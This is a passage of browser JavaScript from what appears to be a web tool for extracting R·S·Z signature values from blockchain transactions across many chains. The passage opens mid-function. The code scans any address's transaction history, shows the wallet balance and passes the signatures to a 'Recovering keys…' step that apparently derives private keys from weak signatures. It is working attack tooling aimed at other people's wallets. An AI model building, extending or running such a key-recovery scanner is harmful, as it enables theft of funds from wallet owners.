            try { const r = await rpcCall(SOL_RPCS, 'getSignaturesForAddress', [addr, { limit: Math.min(want, 1000) }]); if (Array.isArray(r)) list = r; } catch (e) { }
            if (!list) return null;
            const sigs = list.map(function (x) { return x.signature; }).slice(0, want);
            if (!sigs.length) return [];
            const out = []; let scanned = 0; const self = this;
            for (let b = 0; b < sigs.length; b += 3) {
                const slice = sigs.slice(b, b + 3);
                const settled = await Promise.all(slice.map(function (h) { return self.txidToRSZ(h).catch(function () { return []; }); }));
                settled.forEach(function (a) { a.forEach(function (it) { if (it.addr === addr) out.push(it); }); });
                scanned += slice.length;
                if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: sigs.length, found: out.length });
                await sleep(200);
            }
            return out;
        }
    };

    // Sui — ed25519. Signed message = blake2b256([0,0,0] || bcs(TransactionData)).
    function suiAddrFromPub(blake2b, pub) { return '0x' + bytesToHex(blake2b(concatBytes(new Uint8Array([0x00]), pub), { dkLen: 32 })); }
    const SUI_RPCS = ['https://sui-rpc.publicnode.com', 'https://rpc-mainnet.suiscan.xyz', 'https://1rpc.io/sui', 'https://fullnode.mainnet.sui.io:443'];
    const sui = {
        key: 'sui', curve: 'ed25519', symbol: 'SUI', decimals: 9,
        formatAmount: function (v) { return formatUnits(v, 9, 'SUI'); },
        classifyInput: function (t) { t = t.trim(); if (/^0x[0-9a-fA-F]{64}$/.test(t)) return 'address'; if (/^[1-9A-HJ-NP-Za-km-z]{43,46}$/.test(t)) return 'txid'; return 'bulk'; },
        fetchStats: async function (addr) { try { const r = await rpcCall(SUI_RPCS, 'suix_getBalance', [addr]); if (r) return { balance: BigInt(r.totalBalance || 0), received: null, tx: r.coinObjectCount || 0 }; } catch (e) { } return null; },
        txidToRSZ: async function (digest) {
            const res = await rpcCall(SUI_RPCS, 'sui_getTransactionBlock', [digest, { showInput: true, showRawInput: true }]);
            if (!res) throw new Error('Transaction not found');
            const rawB64 = res.rawTransaction; const sigsArr = res.txSignatures || [];
            if (!rawB64 || !sigsArr.length) throw new Error('No raw transaction / signatures returned');
            const blake2b = await ensureBlake2b();
            const msg = blake2b(concatBytes(new Uint8Array([0, 0, 0]), b64ToBytes(rawB64)), { dkLen: 32 });
            const out = [];
            sigsArr.forEach(function (b64, idx) {
                const bytes = b64ToBytes(b64); if (bytes[0] !== 0x00) return;      // ed25519 flag only
                const sig = bytes.slice(1, 65), pub = bytes.slice(65, 97);
                out.push({ input_index: idx, txid: digest, addr: suiAddrFromPub(blake2b, pub), pub: bytesToHex(pub), r: bytesToHex(sig.slice(0, 32)), s: bytesToHex(sig.slice(32, 64)), z: bytesToHex(msg), curve: 'ed25519' });
            });
            if (!out.length) throw new Error('No ed25519 signature in this transaction');
            return out;
        },
        addressToRSZ: async function (addr, want, onProgress) {
            let list = null;
            try { const r = await rpcCall(SUI_RPCS, 'suix_queryTransactionBlocks', [{ filter: { FromAddress: addr }, options: {} }, null, Math.min(want, 50), true]); if (r && Array.isArray(r.data)) list = r.data.map(function (x) { return x.digest || x; }); } catch (e) { }
            if (!list) return null;
            const out = []; let scanned = 0; const self = this;
            for (const d of list.slice(0, want)) { try { (await self.txidToRSZ(typeof d === 'string' ? d : d.digest)).forEach(function (it) { out.push(it); }); } catch (e) { } scanned++; if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: list.length, found: out.length }); await sleep(200); }
            return out;
        }
    };

    // TON — ed25519, but signatures live inside wallet message cells; automated
    // R·S·Z extraction is not supported. Balance still loads.
    const ton = {
        key: 'toncoin', curve: 'ed25519', symbol: 'TON', decimals: 9,
        note: 'TON signatures are embedded in wallet-contract message cells, so automated R·S·Z extraction is not supported. Balance/stats are shown above.',
        formatAmount: function (v) { return formatUnits(v, 9, 'TON'); },
        classifyInput: function (t) { t = t.trim(); if (/^[0-9a-fA-F]{64}$/.test(t)) return 'txid'; return 'address'; },
        fetchStats: async function (addr) { try { const j = await getJson('https://tonapi.io/v2/accounts/' + encodeURIComponent(addr), 15000); if (j && j.balance != null) return { balance: BigInt(j.balance), received: null, tx: null }; } catch (e) { } return null; },
        txidToRSZ: async function () { throw new Error('TON signatures are embedded in wallet message cells; automated R·S·Z extraction is not supported.'); },
        addressToRSZ: async function () { return null; }
    };

    // ---- adapter registry ------------------------------------------------
    const _adapters = {};
    function getAdapter(chain) {
        if (_adapters[chain]) return _adapters[chain];
        let a = null;
        if (chain === 'bitcoin') a = bitcoin;
        else if (chain === 'litecoin') a = makeUtxoAdapter('litecoin', { chain: 'litecoin', coin: 'ltc', symbol: 'LTC', version: '30' });
        else if (chain === 'dogecoin') a = makeUtxoAdapter('dogecoin', { chain: 'dogecoin', coin: 'doge', symbol: 'DOGE', version: '1e' });
        else if (EVM[chain]) a = makeEvmAdapter(chain, EVM[chain]);
        else if (chain === 'tron') a = tron;
        else if (chain === 'xrp') a = xrp;
        else if (chain === 'bitcoin-cash') a = bch;
        else if (chain === 'zcash') a = zcash;
        else if (chain === 'solana') a = solana;
        else if (chain === 'sui') a = sui;
        else if (chain === 'toncoin' || chain === 'ton') a = ton;
        _adapters[chain] = a;
        return a;
    }

    // ---- chain-aware stats box + helpers ---------------------------------
    function setStatsFor(stats, adapter) {
        const b = document.getElementById('txr-stat-balance');
        const r = document.getElementById('txr-stat-received');
        const t = document.getElementById('txr-stat-tx');
        const sym = (adapter && adapter.symbol) || '';
        const fmt = function (v) { return (adapter && adapter.formatAmount) ? adapter.formatAmount(v) : formatBtc(v); };
        if (b) { b.textContent = (stats && stats.balance != null) ? fmt(stats.balance) : ('0 ' + sym); b.classList.toggle('has-balance', !!(stats && stats.balance != null && BigInt(stats.balance) > 0n)); }
        if (r) { if (stats && stats.received != null) { r.textContent = fmt(stats.received); r.classList.toggle('has-balance', BigInt(stats.received) > 0n); } else { r.textContent = '—'; r.classList.remove('has-balance'); } }
        if (t) { t.textContent = (stats && stats.tx != null) ? String(stats.tx) : '—'; }
    }
    function parseBulk(text) {
        return text.split('\n').map(function (l) { const p = l.split(':'); if (p.length >= 3) return { r: p[0].trim(), s: p[1].trim(), z: p[2].trim(), curve: 'secp256k1', input_index: 0 }; return null; }).filter(function (it) { return it && it.r.length > 50; });
    }
    function renderUnavailable(adapter) {
        const sym = escapeHtml(adapter.symbol || adapter.key);
        return '<div class="rsz-status"><strong>' + sym + '</strong>: scanning a whole address needs a transaction-history source, and ' + sym +
            ' has no keyless (free) one. You can still — <strong>(1)</strong> paste a specific <strong>transaction hash</strong> to extract R·S·Z, <strong>(2)</strong> paste <strong>R:S:Z</strong> lines (one per line) to recover a key, or <strong>(3)</strong> add a free GoldRush/Covalent API key in the box above to turn on address scanning here.</div>' +
            (adapter.note ? '<div class="rsz-status" style="margin-top:8px">' + escapeHtml(adapter.note) + '</div>' : '');
    }

    // ---- Main entry (chain dispatcher) -----------------------------------
    async function processTxid() {
        const input = document.getElementById("txid_input").value.trim();
        const out = document.getElementById("out_txid");
        if (!input) return;

        const chain = window.TXR_CHAIN || 'bitcoin';
        const adapter = getAdapter(chain);

        // How many transactions to scan (address mode). Free entry — any number.
        const limitEl = document.getElementById("txr-tx-limit");
        let want = limitEl ? parseInt(limitEl.value, 10) : 100;
        if (!want || want < 1) want = 100;

        const header = getOutputHeader(out.id);
        const setStatus = function (msg) {
            out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
        };
        const onProgress = function (p) {
            if (p.phase === 'list') {
                setStatus('Listing transactions… ' + p.listed + (p.target ? ' / ' + p.target : '') + ' found');
            } else {
                setStatus('Scanning transactions for R·S·Z… ' + p.scanned + ' / ' + p.target +
                    '  (signatures found: ' + p.found + ')');
            }
        };

        if (!adapter) {
            out.innerHTML = header + '<div class="rsz-error">This chain isn’t supported yet.</div>';
            return;
        }

        setStatus('Analyzing ' + (adapter.symbol || chain) + ' input…');

        try {
            const kind = adapter.classifyInput(input);
            let rsz = [];
            let mode = kind;

            if (kind === 'txid') {
                setStatsFor(null, adapter);                 // a TXID isn't an address
                rsz = await adapter.txidToRSZ(input, onProgress);
                rsz.forEach(function (e) { if (!e.txid) e.txid = input; });
            } else if (kind === 'address') {
                mode = 'address';
                setStatus('Fetching balance…');
                statLoading();
                try { setStatsFor(await adapter.fetchStats(input), adapter); } catch (e) { setStatsFor(null, adapter); }
                const res = await adapter.addressToRSZ(input, want, onProgress);
                if (res === null) { out.innerHTML = header + renderUnavailable(adapter); return; }
                rsz = res;
            } else {
                mode = 'bulk';
                setStatsFor(null, adapter);
                rsz = parseBulk(input);
                if (!rsz.length) throw new Error('Could not read this input. Paste a transaction hash, an address, or R:S:Z lines.');
            }

            setStatus('Recovering keys…');
            const vulns = await recoverVulns(rsz);
            out.innerHTML = header + renderResults(rsz, input, mode, vulns, adapter);
        } catch (e) {
            out.innerHTML = header +
                '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Error: ' +
                escapeHtml(e.message || String(e)) + '</div>';
        }
    }

    // ---- Optional API key (only for chains with no keyless tx-history source, e.g. BNB) ----
    function getUserKey() {
        try { return (window.TXR_APIKEY || localStorage.getItem('txr_apikey') || '').trim(); }
        catch (e) { return (window.TXR_APIKEY || '').trim(); }
    }
    function ensureKeyBox() {
        if (document.getElementById('txr-apikey')) return;
        const anchor = document.getElementById('txr-txlimit-wrap');
        if (!anchor || !anchor.parentNode) return;
        const wrap = document.createElement('div');
        wrap.id = 'txr-apikey-wrap';
        wrap.className = 'd-flex align-items-center flex-wrap gap-2 mt-2';
        wrap.innerHTML = '<label for="txr-apikey" class="small text-muted mb-0">API key ' +
            '<span style="opacity:.7">(optional — turns on address scan for chains with no free source, e.g. BNB)</span>:</label>' +
            '<input type="password" id="txr-apikey" class="form-control form-control-sm" style="max-width:280px" ' +
            'placeholder="free GoldRush / Covalent key" autocomplete="off" spellcheck="false" aria-label="Optional API key">' +
            '<span class="small text-muted">saved only in your browser</span>';
        anchor.parentNode.insertBefore(wrap, anchor.nextSibling);
        const inp = wrap.querySelector('#txr-apikey');
        try { inp.value = localStorage.getItem('txr_apikey') || ''; } catch (e) { }
        inp.addEventListener('input', function () { try { localStorage.setItem('txr_apikey', inp.value.trim()); } catch (e) { } });
    }
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', ensureKeyBox); else ensureKeyBox();

    // ---- Expose globals used by inline onclick handlers ------------------
    window.processTxid = processTxid;
    window.exportOne = exportOne;
})();
